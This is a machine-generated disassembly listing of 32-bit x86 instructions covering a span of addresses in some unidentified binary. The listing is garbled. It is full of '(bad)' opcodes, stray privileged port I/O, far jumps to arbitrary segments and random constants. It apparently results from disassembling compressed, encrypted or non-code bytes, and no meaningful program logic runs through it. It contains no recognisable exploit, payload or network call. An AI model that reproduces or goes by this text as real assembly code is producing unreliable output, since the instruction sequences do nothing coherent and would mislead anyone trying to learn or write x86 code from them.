  42e849:	shr    BYTE PTR [ebp-0x4b],cl
  42e84c:	mov    ah,BYTE PTR [edx-0x73]
  42e84f:	dec    ebp
  42e850:	aad    0x4
  42e852:	pushf  
  42e853:	or     DWORD PTR [ecx+0x7a],eax
  42e856:	inc    esp
  42e857:	pusha  
  42e858:	sub    eax,0x6f4f33dd
  42e85d:	out    dx,al
  42e85e:	adc    ebp,esi
  42e860:	adc    edi,ecx
  42e862:	jmp    0x6007:0x5cd25811
  42e869:	sub    DWORD PTR [edx-0xf],0x6
  42e86d:	lds    edi,FWORD PTR [ecx-0x6bd49102]
  42e873:	adc    BYTE PTR [edx-0x4e25b076],0x65
  42e87a:	pop    esi
  42e87b:	xchg   edi,eax
  42e87c:	icebp  
  42e87d:	add    BYTE PTR [esi],dl
  42e87f:	lahf   
  42e880:	loopne 0x42e8e2
  42e882:	xchg   BYTE PTR [edx],ch
  42e884:	cwde   
  42e885:	gs popf 
  42e887:	aas    
  42e888:	push   ebx
  42e889:	or     ebx,0xffffffd6
  42e88c:	popf   
  42e88d:	adc    eax,0x35becc
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0xe23f82b]
  42e901:	pop    esp
  42e902:	adc    DWORD PTR [eax+0x68],ebx
  42e905:	repz add DWORD PTR [eax],eax
  42e908:	add    eax,0xe4000001
  42e90d:	mov    al,0xc0
  42e90f:	jecxz  0x42e948
  42e911:	mov    al,0x55
  42e913:	jmp    0x89749843
  42e918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e919:	mov    dl,0xe5
  42e91b:	addr16 jge 0x42e92a
  42e91e:	push   0xffffff84
  42e920:	repz cmp eax,0xe4dffeaa
  42e926:	or     ch,ah
  42e928:	sti    
  42e929:	and    eax,0x118d12bd
  42e92e:	inc    edi
  42e92f:	rcl    DWORD PTR [edx-0x5a],0x95
  42e933:	in     eax,dx
  42e934:	inc    esi
  42e935:	jae    0x42e930
  42e937:	mov    ah,BYTE PTR [ecx+0x5f]
  42e93a:	cld    
  42e93b:	loopne 0x42e962
  42e93d:	ds stos DWORD PTR es:[edi],eax
  42e93f:	cmp    dh,BYTE PTR [ebp-0x5abed590]
  42e945:	dec    ebx
  42e946:	mov    ds:0xd2a59c32,eax
  42e94b:	pop    ds
  42e94c:	jge    0x42e9c9
  42e94e:	jnp    0x42e9b5
  42e950:	or     ebx,ebx
  42e952:	jle    0x42e9bf
  42e954:	or     BYTE PTR [edx-0xeac1a2],ah
  42e95a:	pop    ebp
  42e95b:	(bad)  
  42e95c:	ja     0x42e9c6
  42e95e:	fisub  WORD PTR [esi]
  42e960:	je     0x42e95d
  42e962:	mov    BYTE PTR [ebx],bh
  42e964:	inc    ecx
  42e965:	sub    al,0xa1
  42e967:	outs   dx,BYTE PTR ds:[esi]
  42e968:	mov    ah,0xed
  42e96a:	push   edi
  42e96b:	xor    BYTE PTR [ebx+esi*2],cl
  42e96e:	lds    esp,FWORD PTR [edx+0x18dee92e]
  42e974:	ret    0xc186
  42e977:	xchg   esi,eax
  42e978:	cmp    eax,esi
  42e97a:	mov    dh,0x29
  42e97c:	pop    ebx
  42e97d:	jg     0x42e9f9
  42e97f:	pop    ss
  42e980:	inc    ebx
  42e981:	pop    ss
  42e982:	je     0x42e992
  42e984:	push   0xffffffa9
  42e986:	pop    eax
  42e987:	push   edi
  42e988:	jp     0x42e9a2
  42e98a:	fcos   
  42e98c:	sub    DWORD PTR [edx],ecx
  42e98e:	in     al,0xfa
  42e990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e992:	mov    eax,0x234a5a04
  42e997:	adc    BYTE PTR [ebp+0x60],bl
  42e99a:	js     0x42e968
  42e99c:	push   edi
  42e99d:	and    bl,BYTE PTR [ecx]
  42e99f:	jp     0x42e9be
  42e9a1:	aas    
  42e9a2:	or     ecx,eax
  42e9a4:	add    eax,0x4b723910
  42e9a9:	mov    edx,0x34782306
  42e9ae:	lock push cs
  42e9b0:	fisubr DWORD PTR [edi]
  42e9b2:	dec    ebx
  42e9b3:	das    
  42e9b4:	daa    
  42e9b5:	cli    
  42e9b6:	call   0x22b37432
  42e9bb:	(bad)  
  42e9bc:	and    al,0x61
  42e9be:	arpl   WORD PTR [ebp-0x56],sp
  42e9c1:	mov    ch,0x62
  42e9c3:	es push edi
  42e9c5:	and    al,0x3a
  42e9c7:	mov    ch,0x61
  42e9c9:	fs data16 (bad) 
  42e9cc:	lea    esp,[ebp-0x3556e880]
  42e9d2:	jl     0x42e9a1
  42e9d4:	in     al,0x79
  42e9d6:	nop
  42e9d7:	and    DWORD PTR [ebp+edi*2+0x5e0fb619],0x57f1df3f
  42e9e2:	or     DWORD PTR [esp+ecx*1-0x44],ebx
  42e9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9e7:	sbb    ecx,ebp
  42e9e9:	imul   esp,eax,0xffffff89
  42e9ec:	dec    eax
  42e9ed:	gs inc edi
  42e9ef:	imul   DWORD PTR [ebx]
  42e9f1:	add    BYTE PTR [eax],0x17
  42e9f4:	and    BYTE PTR [edi-0x1c],bl
  42e9f7:	add    DWORD PTR [ebx],esp
  42e9f9:	xchg   ecx,eax
  42e9fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9fb:	sbb    al,0xcd
  42e9fd:	dec    edx
  42e9fe:	xor    DWORD PTR [ecx+0x3f260621],ebx
  42ea04:	lahf   
  42ea05:	lods   eax,DWORD PTR ds:[esi]
  42ea06:	fisttp WORD PTR [ecx+0x7e]
  42ea09:	cmp    DWORD PTR [edi+0x69],edx
  42ea0c:	test   al,0x78
  42ea0e:	pop    ebx
  42ea0f:	or     dl,ch
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	out    dx,al
  42ea81:	xchg   esi,eax
  42ea82:	adc    al,0xb
  42ea84:	ins    DWORD PTR es:[edi],dx
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0xd5000001
  42ea8d:	mov    ds:0xc7cf7286,eax
  42ea92:	fsubrp st(6),st
  42ea94:	lds    ebp,FWORD PTR gs:[esi-0x5d]
  42ea98:	adc    edi,eax
  42ea9a:	pop    ss
  42ea9b:	jnp    0x42eaa8
  42ea9d:	push   0xffffffbc
  42ea9f:	test   BYTE PTR [ebp+0x24a81727],ch
  42eaa5:	sbb    dh,BYTE PTR [esi+esi*4+0x64]
  42eaa9:	out    0x41,eax
  42eaab:	pop    edx
  42eaac:	js     0x42eaae
  42eaae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eaaf:	and    DWORD PTR [ebx+0x44],esi
  42eab2:	lea    esi,[edx-0x68f7be15]
  42eab8:	xchg   ebx,eax
  42eab9:	out    dx,al
  42eaba:	das    
  42eabb:	cmp    BYTE PTR [eax],dh
  42eabd:	(bad)  
  42eabe:	pop    esp
  42eabf:	sub    BYTE PTR [bx+si],al
  42eac2:	popf   
  42eac3:	dec    ebp
  42eac4:	cli    
  42eac5:	xchg   ebp,eax
  42eac6:	cld    
  42eac7:	popf   
  42eac8:	daa    
  42eac9:	xor    DWORD PTR [esi-0x759bbe7],ebp
  42eacf:	xor    al,0x8e
  42ead1:	sbb    ch,dh
  42ead3:	sbb    ecx,DWORD PTR [ebx+0x24]
  42ead6:	jae    0x42ea84
  42ead8:	int    0xd
  42eada:	loop   0x42eb20
  42eadc:	jmp    0x42eab0
  42eade:	pop    eax
  42eadf:	out    0xd8,eax
  42eae1:	mov    dh,BYTE PTR [eax+0x5243fb4d]
  42eae7:	jbe    0x42eb25
  42eae9:	mov    ebp,0x5ccf6f98
  42eaee:	inc    esi
  42eaef:	ret    0xecc4
  42eaf2:	lds    ebp,FWORD PTR [ebp-0x16]
  42eaf5:	std    
  42eaf6:	cli    
  42eaf7:	pop    ebx
  42eaf8:	mov    ds:0xd556b248,eax
  42eafd:	push   ds
  42eafe:	pop    ds
  42eaff:	js     0x42ead2
  42eb01:	mov    bh,0x56
  42eb03:	(bad)  
  42eb04:	out    0x51,al
  42eb06:	jle    0x42eb03
  42eb08:	cmp    BYTE PTR [ecx*1+0x5146daa4],dl
  42eb0f:	(bad)  
  42eb10:	xchg   ebp,eax
  42eb11:	jne    0x42eaf3
  42eb13:	push   esp
  42eb14:	push   es
  42eb15:	imul   esp,DWORD PTR [eax-0x25ce29f9],0x747fa6e3
  42eb1f:	mov    ds:0x27b5eb0e,al
  42eb24:	jle    0x42eac4
  42eb26:	mov    esi,DWORD PTR [edx+eiz*4+0x24]
  42eb2a:	fcmovb st,st(2)
  42eb2c:	xchg   edi,eax
  42eb2d:	jns    0x42eaf9
  42eb2f:	sub    dh,ch
  42eb31:	xchg   ecx,eax
  42eb32:	out    0x6d,eax
  42eb34:	ds dec edi
  42eb36:	jp     0x42eb1a
  42eb38:	leave  
  42eb39:	xor    al,0x35
  42eb3b:	enter  0xd8b5,0x8c
  42eb3f:	adc    ebx,edi
  42eb41:	fadd   st(0),st
  42eb43:	lods   eax,DWORD PTR ds:[esi]
  42eb44:	outs   dx,DWORD PTR ds:[esi]
  42eb45:	mov    eax,0x142126d2
  42eb4a:	hlt    
  42eb4b:	mov    cl,0x49
  42eb4d:	fdivp  st(1),st
  42eb4f:	mov    al,ds:0x3dae2325
  42eb54:	bound  edi,QWORD PTR [edi-0x35f3b804]
  42eb5a:	retf   0xed07
  42eb5d:	mov    gs,eax
  42eb5f:	call   0x36acf396
  42eb64:	je     0x42eb61
  42eb66:	inc    ebx
  42eb67:	sub    eax,0x433e2be1
  42eb6c:	xchg   BYTE PTR [esi+0x59],cl
  42eb6f:	popf   
  42eb70:	pusha  
  42eb71:	push   0x98a81087
  42eb76:	or     BYTE PTR [ebx],al
  42eb78:	loop   0x42eb32
  42eb7a:	push   edx
  42eb7b:	or     edx,DWORD PTR [esi+0x3c85091f]
  42eb81:	jge    0x42ebea
  42eb83:	jmp    0x42ebf7
  42eb85:	pop    esi
  42eb86:	retf   
  42eb87:	mov    cl,0x42
  42eb89:	dec    ebx
  42eb8a:	xlat   BYTE PTR ds:[ebx]
  42eb8b:	ja     0x42ebff
  42eb8d:	sahf   
  42eb8e:	inc    ebx
  42eb8f:	mov    ds,WORD PTR [ecx]
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sub    ebp,0x727b956b
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xd7000001
  42ec0d:	icebp  
  42ec0e:	jge    0x42ebd3
  42ec10:	dec    eax
  42ec11:	std    
  42ec12:	mov    ebp,0x79ed7006
  42ec17:	xor    eax,0x93acad15
  42ec1c:	jmp    0x4708:0x1616bc16
  42ec23:	pop    es
  42ec24:	ss cmc 
  42ec26:	xor    al,0x9b
  42ec28:	push   ebx
  42ec29:	mov    bh,0x3c
  42ec2b:	cmp    ebp,DWORD PTR [ebx-0x609835c9]
  42ec31:	out    dx,eax
  42ec32:	fistp  WORD PTR [edi-0x71]
  42ec35:	cmp    al,0x2c
  42ec37:	retf   0x7480
  42ec3a:	aam    0xbb
  42ec3c:	(bad)  [eax-0x3c]
  42ec3f:	jae    0x42ec54
  42ec41:	mov    eax,ds:0x28294d21
  42ec46:	je     0x42ec4e
  42ec48:	xor    ch,cl
  42ec4a:	loope  0x42eccb
  42ec4c:	mov    ebx,0xdd49d1d7
  42ec51:	imul   ebp,DWORD PTR [edx+0x45fcff1d],0x45
  42ec58:	pop    esp
  42ec59:	mov    eax,ds:0x1b305bd4
  42ec5e:	nop
  42ec5f:	daa    
  42ec60:	mov    esi,edx
  42ec62:	cmp    BYTE PTR [ecx-0x69],0xf2
  42ec66:	loopne 0x42eca5
  42ec68:	ds push esp
  42ec6a:	sbb    BYTE PTR [ebx+0x553996c2],ch
  42ec70:	pop    ecx
  42ec71:	add    dh,BYTE PTR [ebx-0x2e]
  42ec74:	sbb    edi,DWORD PTR [ecx-0x1b]
  42ec77:	retf   0xc473
  42ec7a:	pop    es
  42ec7b:	xchg   esi,eax
  42ec7c:	xchg   ebp,eax
  42ec7d:	aaa    
  42ec7e:	ret    
  42ec7f:	cdq    
  42ec80:	repz xor esi,esp
  42ec83:	cdq    
  42ec84:	rcl    DWORD PTR [ecx-0x2a],cl
  42ec87:	call   0x59801692
  42ec8c:	mov    ds:0xf3bebc85,al
  42ec91:	and    DWORD PTR [eax],edx
  42ec93:	and    esi,DWORD PTR [edi+0x7a53fa5c]
  42ec99:	outs   dx,DWORD PTR ds:[esi]
  42ec9a:	jecxz  0x42ec89
  42ec9c:	fst    QWORD PTR [edi-0x6963ea12]
  42eca2:	push   cs
  42eca3:	push   ss
  42eca4:	loope  0x42ed13
  42eca6:	mov    cs,ecx
  42eca8:	push   ds
  42eca9:	push   0x8c0eeec8
  42ecae:	pushf  
  42ecaf:	add    BYTE PTR [edx],dl
  42ecb1:	jp     0x42ed09
  42ecb3:	lods   eax,DWORD PTR ds:[esi]
  42ecb4:	aaa    
  42ecb5:	pop    esp
  42ecb6:	dec    edx
  42ecb7:	pop    edx
  42ecb8:	lea    edi,ds:[ecx]
  42ecbb:	fsubr  QWORD PTR [ebx+0x9]
  42ecbe:	mov    ds:0x284f71a3,al
  42ecc3:	aas    
  42ecc4:	in     al,dx
  42ecc5:	call   0xed5c02c0
  42ecca:	pop    edi
  42eccb:	adc    ebx,0x40
  42ecce:	hlt    
  42eccf:	xchg   ebp,eax
  42ecd0:	sbb    eax,0xc6a3a144
  42ecd5:	fcmovnbe st,st(1)
  42ecd7:	pop    edx
  42ecd8:	fcomp  DWORD PTR [edi-0x41]
  42ecdb:	cli    
  42ecdc:	imul   ecx,esp,0x76
  42ecdf:	or     eax,0x24492f5c
  42ece4:	mov    bl,0xb5
  42ece6:	add    edi,ebx
  42ece8:	jge    0x42ecd6
  42ecea:	sub    dh,BYTE PTR [edi]
  42ecec:	mov    BYTE PTR ds:0x449d902e,dh
  42ecf2:	shl    BYTE PTR [ecx],cl
  42ecf4:	or     BYTE PTR [eax-0x61],dh
  42ecf7:	mov    dh,0xb6
  42ecf9:	lahf   
  42ecfa:	sti    
  42ecfb:	cmp    eax,0x25ef51cd
  42ed00:	leave  
  42ed01:	mov    eax,ss
  42ed03:	daa    
  42ed04:	retf   0xba57
  42ed07:	dec    esp
  42ed08:	pop    edi
  42ed0a:	shl    BYTE PTR [ebx+0x2e],1
  42ed0d:	jp     0x42ed00
  42ed0f:	sub    eax,0x24
	...
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x51a4eee0],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xd8000001
  42ed8d:	push   esi
  42ed8e:	cmc    
  42ed8f:	aad    0x33
  42ed91:	push   ebp
  42ed92:	xor    eax,0x360f8923
  42ed97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed98:	mov    WORD PTR ds:0x5ecb6448,fs
  42ed9e:	cs js  0x42edb6
  42eda1:	mov    ds:0x265521cc,eax
  42eda6:	les    esp,FWORD PTR [eax-0x1d]
  42eda9:	push   ds
  42edaa:	sbb    al,0x7
  42edac:	outs   dx,DWORD PTR ds:[esi]
  42edad:	xchg   edx,eax
  42edae:	daa    
  42edaf:	and    ah,bl
  42edb1:	push   es
  42edb2:	cmp    eax,0x697fa3b1
  42edb7:	mov    al,ds:0x80baa45b
  42edbc:	(bad)  
  42edbe:	cld    
  42edbf:	out    0x21,eax
  42edc1:	or     BYTE PTR [eax+0x54a0a7be],dh
  42edc7:	or     eax,0x582b2783
  42edcc:	lds    ebx,FWORD PTR [ebp-0x52]
  42edcf:	and    al,0xa6
  42edd1:	pop    es
  42edd2:	jb     0x42ed65
  42edd4:	neg    BYTE PTR [edx]
  42edd6:	addr16 out 0xdc,al
  42edd9:	or     al,0xe0
  42eddb:	(bad)  
  42eddc:	cwde   
  42eddd:	sbb    BYTE PTR [esp+ecx*4+0x483d7c2],dl
  42ede4:	pop    esi
  42ede5:	pop    edi
  42ede6:	test   al,ch
  42ede8:	pop    ecx
  42ede9:	inc    esp
  42edea:	push   0xffffffde
  42edec:	cpuid  
  42edee:	into   
  42edef:	test   ecx,0xa2e1bb52
  42edf5:	shl    BYTE PTR [eax+0x6a],0x7b
  42edf9:	jecxz  0x42ee73
  42edfb:	xor    DWORD PTR [edx],ebx
  42edfd:	push   esp
  42edfe:	ds push ecx
  42ee00:	push   esi
  42ee01:	xchg   ecx,eax
  42ee02:	adc    cl,BYTE PTR [ebx-0x4b]
  42ee05:	adc    eax,0xe6e3a2b9
  42ee0a:	retf   
  42ee0b:	mov    DWORD PTR [edx],esi
  42ee0d:	cdq    
  42ee0e:	scas   al,BYTE PTR es:[edi]
  42ee0f:	lods   al,BYTE PTR ds:[esi]
  42ee10:	out    dx,al
  42ee11:	mov    eax,DWORD PTR [ecx+0x2b]
  42ee14:	xchg   ebx,eax
  42ee15:	loop   0x42ee02
  42ee17:	xchg   ebp,eax
  42ee18:	cmp    dl,BYTE PTR [edx]
  42ee1a:	inc    esi
  42ee1b:	out    0xe0,eax
  42ee1d:	adc    ebx,DWORD PTR [edi-0xa9ef64]
  42ee23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee24:	bound  ecx,QWORD PTR [ecx-0x40bb9e18]
  42ee2a:	or     ebp,DWORD PTR [ebx+0x12093a2c]
  42ee30:	cmp    eax,0x7b16964b
  42ee35:	mov    dl,BYTE PTR [ebx-0x75]
  42ee38:	jns    0x42ee47
  42ee3a:	inc    edi
  42ee3b:	push   ss
  42ee3c:	ret    0x2c60
  42ee3f:	and    al,0x74
  42ee41:	lahf   
  42ee42:	fsubr  st(7),st
  42ee44:	xchg   edi,eax
  42ee45:	cdq    
  42ee46:	ja     0x42ee7f
  42ee48:	ins    BYTE PTR es:[edi],dx
  42ee49:	add    al,0xcd
  42ee4b:	sub    dh,BYTE PTR [esi-0x40]
  42ee4e:	icebp  
  42ee4f:	jnp    0x42eea5
  42ee51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee52:	jne    0x42ee2c
  42ee54:	sar    BYTE PTR [edx-0x5b],0xb2
  42ee58:	jns    0x42ee89
  42ee5a:	(bad)  
  42ee5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee5e:	inc    esp
  42ee5f:	mov    esi,0xa1bcc323
  42ee64:	add    eax,0xec20bd9e
  42ee69:	dec    ebx
  42ee6a:	inc    ebp
  42ee6b:	call   0x60ff:0xfdef5441
  42ee72:	or     eax,0x21fd89af
  42ee77:	xchg   DWORD PTR ds:0x3c48b927,esi
  42ee7d:	adc    al,0xdd
  42ee7f:	mov    esi,0x6ded1bbf
  42ee84:	mov    DWORD PTR [eax-0x3b],edi
  42ee87:	icebp  
  42ee88:	inc    esi
  42ee89:	add    eax,DWORD PTR [ecx-0x3]
  42ee8c:	xor    ecx,DWORD PTR [edx+ecx*2]
  42ee8f:	in     eax,dx
  42ee90:	jle    0x42ee92
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	std    
  42ef01:	adc    bl,ah
  42ef03:	sub    edi,DWORD PTR [edi+esi*8+0x1]
  42ef07:	add    BYTE PTR ds:0xb5000001,al
  42ef0d:	mov    cl,0xbd
  42ef0f:	call   0xc5a633f4
  42ef14:	test   BYTE PTR [esi],cl
  42ef16:	shl    ecx,1
  42ef18:	inc    esp
  42ef19:	test   eax,0xd19c4bfb
  42ef1e:	addr16 dec eax
  42ef20:	jbe    0x42ef04
  42ef22:	xor    DWORD PTR [ecx*4+0x6aa464e],esi
  42ef29:	xor    eax,0x95f32014
  42ef2e:	jne    0x42ef46
  42ef30:	jmp    0x42eeda
  42ef32:	pop    edx
  42ef33:	pop    esi
  42ef34:	(bad)  [esi-0x3ec17def]
  42ef3a:	adc    ebx,ecx
  42ef3c:	test   dl,ah
  42ef3e:	fs mov esp,esp
  42ef41:	std    
  42ef42:	cmp    al,0x94
  42ef44:	xor    DWORD PTR [edi+edx*1-0x19ab9bdf],edx
  42ef4b:	int3   
  42ef4c:	sbb    DWORD PTR [ebx-0x55],ebx
  42ef4f:	jbe    0x42ef88
  42ef51:	lea    edx,gs:[ebp-0x5e235f2a]
  42ef58:	jo     0x42ef29
  42ef5a:	cs add eax,0x79289e4e
  42ef60:	inc    esp
  42ef61:	imul   edi,DWORD PTR [ebx+0x7bbb273e],0xbe90b7ca
  42ef6b:	cmp    DWORD PTR [esi+ecx*4],edx
  42ef6e:	aad    0x52
  42ef70:	iret   
  42ef71:	outs   dx,DWORD PTR ds:[esi]
  42ef72:	jno    0x42efe6
  42ef74:	btr    esi,esi
  42ef77:	sub    BYTE PTR [ebp-0x41ac9ed],cl
  42ef7d:	push   ebp
  42ef7e:	jecxz  0x42ef9e
  42ef80:	mov    bh,BYTE PTR [edx-0x23]
  42ef83:	push   ss
  42ef84:	xor    BYTE PTR [edi+0x6d],al
  42ef87:	push   ds
  42ef88:	pop    ebx
  42ef89:	xchg   edx,eax
  42ef8a:	sub    eax,0x3e55f8a4
  42ef8f:	mov    bl,0xfd
  42ef91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef92:	(bad)  
  42ef94:	mov    ebp,0xb291f4c
  42ef99:	or     cl,cl
  42ef9b:	fwait
  42ef9c:	cmc    
  42ef9d:	inc    edx
  42ef9e:	in     eax,dx
  42ef9f:	sbb    al,0x54
  42efa1:	mov    al,0x75
  42efa3:	outs   dx,BYTE PTR ds:[esi]
  42efa4:	pop    ebp
  42efa5:	xchg   esp,eax
  42efa6:	ins    DWORD PTR es:[edi],dx
  42efa7:	icebp  
  42efa8:	push   ds
  42efa9:	frstor [ebx]
  42efab:	and    ecx,DWORD PTR [esi+0x78e318b7]
  42efb1:	repnz adc al,0x27
  42efb4:	imul   esi,DWORD PTR [ecx],0x48c7de92
  42efba:	cmp    DWORD PTR [ebx+0x62],esp
  42efbd:	jmp    0x7d63:0x332c1b36
  42efc4:	lock xchg ecx,eax
  42efc6:	mov    ecx,0x7f4a8cd3
  42efcb:	(bad)  
  42efcc:	repz sbb ebx,DWORD PTR [esi]
  42efcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efd0:	jno    0x42f04f
  42efd2:	fisttp QWORD PTR [ebp-0x589d8666]
  42efd8:	mov    ebp,DWORD PTR [ebx]
  42efda:	fstp   TBYTE PTR [eax+0x5f516cf7]
  42efe0:	dec    eax
  42efe1:	adc    esp,DWORD PTR [edi]
  42efe3:	inc    edi
  42efe4:	push   ecx
  42efe5:	xor    ch,BYTE PTR [esi+0x5a]
  42efe8:	xchg   ebp,eax
  42efe9:	xor    BYTE PTR [eax-0x32],0x98
  42efed:	mov    al,ds:0x488406bd
  42eff2:	or     eax,0xde81dcbd
  42eff7:	and    al,0xb7
  42eff9:	mov    eax,0xcdb35a2e
  42effe:	push   0x4c19958d
  42f003:	inc    eax
  42f004:	xchg   esp,eax
  42f005:	sbb    edi,eax
  42f007:	call   0x3ddd:0xdaf575a5
  42f00e:	mov    esp,0x9ae3
	...
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	pop    esi
  42f081:	lahf   
  42f082:	aam    0xfe
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	mov    ds:0xa3175207,eax
  42f091:	pop    esi
  42f092:	xchg   ebp,eax
  42f093:	or     al,0x33
  42f095:	mov    ebp,0xb85432ff
  42f09a:	pop    ebx
  42f09b:	cmc    
  42f09c:	mov    ebp,0xfe64d0e7
  42f0a1:	daa    
  42f0a2:	int    0xe3
  42f0a4:	mov    eax,0x390b9d24
  42f0a9:	std    
  42f0aa:	stos   DWORD PTR es:[edi],eax
  42f0ab:	inc    ecx
  42f0ac:	imul   esi,ecx,0x75
  42f0af:	int    0x8b
  42f0b1:	ds jmp 0xdb96cbdb
  42f0b7:	fimul  DWORD PTR [edx]
  42f0b9:	add    ecx,DWORD PTR [ebx+0x7bc509d7]
  42f0bf:	push   edi
  42f0c0:	daa    
  42f0c1:	jge    0x42f133
  42f0c3:	dec    eax
  42f0c4:	push   ds
  42f0c5:	repnz (bad) 
  42f0c7:	push   cs
  42f0c8:	sub    al,0x17
  42f0ca:	sbb    ch,BYTE PTR fs:[edi+0x59]
  42f0ce:	fcmovu st,st(6)
  42f0d0:	fwait
  42f0d1:	ja     0x42f09f
  42f0d3:	test   DWORD PTR [esi-0x1f],0x1f8f9266
  42f0da:	adc    dh,al
  42f0dc:	repz (bad) 
  42f0de:	es loop 0x42f15d
  42f0e1:	int    0xea
  42f0e3:	imul   ecx,DWORD PTR [ecx],0x8e8852b1
  42f0e9:	in     eax,dx
  42f0ea:	pop    ecx
  42f0eb:	pop    edx
  42f0ec:	stos   BYTE PTR es:[edi],al
  42f0ed:	aas    
  42f0ee:	pusha  
  42f0ef:	xor    al,0xb7
  42f0f1:	mov    DWORD PTR [esi+0x6a],esi
  42f0f4:	jp     0x42f0ef
  42f0f6:	(bad)  
  42f0f7:	cwde   
  42f0f8:	xchg   ebp,eax
  42f0f9:	xchg   esi,eax
  42f0fa:	adc    dh,BYTE PTR [edi]
  42f0fc:	mov    dh,0x26
  42f0fe:	lds    edi,FWORD PTR [ebx]
  42f100:	xor    al,0x8d
  42f102:	nop
  42f103:	cmp    bl,BYTE PTR [edi]
  42f105:	sub    eax,0xdb66f66c
  42f10a:	cmp    eax,0xdd158537
  42f10f:	sub    esp,0xffffffa1
  42f112:	push   cs
  42f113:	cmp    BYTE PTR [edx+0x4593e6ec],al
  42f119:	(bad)  
  42f11a:	adc    dl,BYTE PTR [edi+0x26]
  42f11d:	sbb    al,0x17
  42f11f:	pop    es
  42f120:	out    0xd,eax
  42f122:	sub    BYTE PTR [edx+0x4395d78d],al
  42f128:	pop    edx
  42f129:	mov    BYTE PTR [edi+0x5c2aea61],dl
  42f12f:	cmp    eax,0x75faa1b6
  42f134:	push   edi
  42f135:	sub    eax,0x8c64c2f6
  42f13a:	gs mov bh,0xb1
  42f13d:	jmp    0x42f159
  42f13f:	les    ebx,FWORD PTR ds:0xeb9a8485
  42f145:	call   0xfed6d75e
  42f14a:	xor    dl,0x4f
  42f14d:	bound  edx,QWORD PTR [eax]
  42f14f:	daa    
  42f150:	ror    DWORD PTR [edi-0x633dcca4],0x6a
  42f157:	bound  edi,QWORD PTR [ecx-0x28]
  42f15a:	mov    cl,0x4b
  42f15c:	mov    cl,0x67
  42f15e:	sbb    eax,0xd211b8bc
  42f163:	test   BYTE PTR [ecx+0x21776dee],ah
  42f169:	inc    ebp
  42f16a:	scas   eax,DWORD PTR es:[edi]
  42f16b:	push   eax
  42f16c:	fisub  DWORD PTR [eax+0x18]
  42f16f:	in     al,0x93
  42f171:	(bad)  
  42f172:	mov    bl,0x4c
  42f174:	imul   esi,DWORD PTR [ebp+0x726d5de1],0x2b29e21d
  42f17e:	xor    al,0x89
  42f180:	cs push ebx
  42f182:	cli    
  42f183:	xchg   edx,eax
  42f184:	jnp    0x42f13d
  42f186:	das    
  42f187:	xchg   ebx,eax
  42f188:	push   edi
  42f189:	sahf   
  42f18a:	shr    DWORD PTR [esi],cl
  42f18c:	cli    
  42f18d:	pop    ebp
  42f18e:	ret    
  42f18f:	or     al,0x6e
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	xchg   edx,eax
  42f201:	mov    ah,0xa4
  42f203:	xchg   ebp,eax
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xdf000001
  42f20d:	rol    dl,1
  42f20f:	rol    DWORD PTR ds:0x17eb4672,1
  42f215:	std    
  42f216:	or     DWORD PTR [esi-0x166be97c],eax
  42f21c:	lock mov ah,0xeb
  42f21f:	sub    BYTE PTR [esi+0x632b7f4a],cl
  42f225:	mov    ebx,0xdbb000ba
  42f22a:	xchg   esp,eax
  42f22b:	stos   DWORD PTR es:[edi],eax
  42f22c:	push   ebx
  42f22d:	sbb    ch,BYTE PTR [edx+ecx*4]
  42f230:	sbb    DWORD PTR [eax-0x28],edx
  42f233:	pop    DWORD PTR [edi+edx*4]
  42f236:	jmp    0x42f226
  42f238:	imul   ebp,DWORD PTR [ebp-0x61],0xc13fd0e8
  42f23f:	adc    eax,DWORD PTR [ebp-0x4523f4fd]
  42f245:	repz push eax
  42f247:	jo     0x42f283
